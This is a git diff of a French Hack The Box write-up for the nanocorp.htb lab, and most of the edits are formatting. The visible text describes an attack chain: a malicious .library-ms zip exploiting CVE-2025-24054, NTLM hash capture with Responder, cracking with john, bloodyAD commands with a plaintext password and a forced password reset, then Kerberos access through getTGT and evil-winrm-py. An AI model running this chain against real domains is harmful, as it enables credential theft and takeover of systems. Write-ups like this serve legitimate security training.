@@ -50,9 +50,11 @@ Néanmoins, dans le site de base est présent un lien vers un site de candidatur
 ### hire.nanocorp.htb :
 
 Sur hire.nanocorp.htb, on peut upload un zip de candidature. Celui-ci va probablement être ouvert par l'admin pour prendre le CV à l'intérieur. Après un peu de réflexion, on se dit que la seule interaction dont on est `quasi-surs`, c'est que l'administrateur va ouvrir notre zip. Il n'est pas obligé de cliquer sur les fichiers qui sont dedans.
-On pense donc à cette vulnérabilité : https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
+On pense donc à cette vulnérabilité :  
+- https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
 
-Le meilleur poc que j'ai pu trouver en ligne est : https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC/tree/main
+Le meilleur poc que j'ai pu trouver en ligne est :  
+- https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC/tree/main
 
 A partir de ce fichier .library-ms, on crée un zip malicieux, et on l'upload. On lance un Responder et boum, l'utilisateur web_svc fait une authentification ntlm à nous. On récupère son hash, qu'on crack avec john. On obtient donc les crédentials :
 
@@ -70,6 +72,8 @@ bloodyAD --host 10.129.238.143 -d nanocorp.htb -u 'web_svc' -p '[REDACTED]' add 
 bloodyAD --host 10.129.238.143 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' set password 'monitoring_svc' 'Password2!'
 ```
 
+---
+
 L'authentification NTLM est désactivée sur la machine donc on récupère un TGT:  
 ```sh
 getTGT.py -dc-ip "10.129.238.143" "nanocorp.htb"/"monitoring_svc":'Password2!'
@@ -84,6 +88,8 @@ On n'oublie pas de modifier son `/etc/krb5.conf` pour ajouter le kdc de nanocorp
 pip install 'evil-winrm-py[kerberos]'
 evil-winrm-py -k --no-pass -i dc01.nanocorp.htb --ssl
 ```
+
+---
 
 ```powershell
 type user.txt
